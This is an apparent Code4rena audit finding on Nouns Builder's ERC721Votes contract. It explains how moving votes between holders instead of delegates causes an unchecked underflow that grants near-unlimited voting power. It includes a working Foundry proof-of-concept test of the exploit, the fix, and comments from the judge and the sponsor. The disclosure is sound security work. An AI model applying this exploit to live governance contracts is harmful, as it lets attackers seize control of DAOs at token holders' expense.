[H-01] User can get unlimited votes
Submitted by saian, also found by 0x4non, Ch_301, davidbrai, izhuer, MEP, Picodes, PwnPatrol, R2, rotcivegaf, scaraven, and Soosh
aftertokenTransferin ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in_moveDelegatesand get unlimited votes.
Proof of Concept
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268
function _afterTokenTransfer(address _from,address _to,uint256 _tokenId) internal override {// Transfer 1 vote from the sender to the recipient_moveDelegateVotes(_from, _to, 1);super._afterTokenTransfer(_from, _to, _tokenId);}
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216
_moveDelegateVotes(prevDelegate, _to, balanceOf(_from));...unchecked {...// Update their voting weight_writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);}
During delegationbalanceOf(from)amount of votes transferred are to the_toaddress
function test_UserCanGetUnlimitedVotes() public {vm.prank(founder);auction.unpause();vm.prank(bidder1);auction.createBid{ value: 1 ether }(2);vm.warp(10 minutes + 1 seconds);auction.settleCurrentAndCreateNewAuction();assertEq(token.ownerOf(2), bidder1);console.log(token.getVotes(bidder1)); // 1console.log(token.delegates(bidder1)); // 0 bidder1vm.prank(bidder1);token.delegate(bidder2);console.log(token.getVotes(bidder1)); // 1console.log(token.getVotes(bidder2)); // 1vm.prank(bidder1);auction.createBid{value: 1 ether}(3);vm.warp(22 minutes);auction.settleCurrentAndCreateNewAuction();assertEq(token.ownerOf(3), bidder1);console.log(token.balanceOf(bidder1)); // 2console.log(token.getVotes(bidder1)); // 2console.log(token.getVotes(bidder2)); // 1vm.prank(bidder1);token.delegate(bidder1);console.log(token.getVotes(bidder1)); // 4console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895}
When user1 delegates to another addressbalanceOf(user1)amount of tokens are subtraced from user2’s votes, this will cause underflow and not revert since the statements are unchecked
Tools Used
Foundry
Recommended Mitigation Steps
Change delegate transfer inafterTokenTransferto
_moveDelegateVotes(delegates(_from), delegates(_to), 1);
Alex the Entreprenerd (judge) increased severity to High and commented:
The warden has shown how to exploit:An unchecked section of the codeAn incorrect logic in moving tokenDelegationTo trigger an underflow that gives each user the maximum voting power.While some setup is necessary (having 1 token), I think the exploit is impactful enough to warrant High Severity, as any attacker will be able to obtain infinite voting power on multiple accounts.In contrast to other reports, this finding (as well as it’s duplicates) are using an unchecked operation to negatively overflow the amount of votes to gain the maximum value.
tbtstl (Nouns Builder) confirmed